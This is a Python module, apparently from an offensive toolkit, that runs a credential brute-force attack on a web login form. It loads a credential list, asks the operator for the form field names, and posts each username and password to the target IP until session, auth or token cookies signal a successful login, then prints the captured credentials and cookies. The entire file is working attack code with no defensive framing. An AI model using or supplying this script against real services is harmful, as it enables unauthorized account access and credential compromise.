import requests
from bruteforce.credentials_loader import load_credentials

def http_bruteforce(ip, port=5000):
    creds = load_credentials()
    url = f"http://{ip}:{port}/"

    print(f"[*] Trying HTTP brute-force on {url}")
    session = requests.Session()

    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; BruteForceTool/1.0)",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    use_username = input("[?] Does the site require a username? (y/n): ").strip().lower() == 'y'

    username_field = input("[?] Enter the name of the username field (default: 'username'): ").strip()
    if not username_field:
        username_field = "username"

    password_field = input("[?] Enter the name of the password field (default: 'password'): ").strip()
    if not password_field:
        password_field = "password"

    for username, password in creds:
        try:
            session.cookies.clear()

            form_data = {password_field: password}
            if use_username:
                form_data[username_field] = username

            response = session.post(
                url,
                data=form_data,
                headers=headers,
                timeout=5
            )

            auth_cookies = {
                k: v for k, v in session.cookies.get_dict().items()
                if 'session' in k.lower() or 'auth' in k.lower() or 'token' in k.lower()
            }

            if auth_cookies:
                user_display = f"{username}:{password}" if use_username else f"{password}"
                print(f"[+] HTTP login success: {user_display}")
                print(f"    -> Session cookies: {auth_cookies}")
                return (username, password) if use_username else (None, password)

        except requests.RequestException as e:
            print(f"[!] Request failed for {username}:{password} - {e}")
            continue

    print("[-] No valid HTTP credentials found.")
    return None
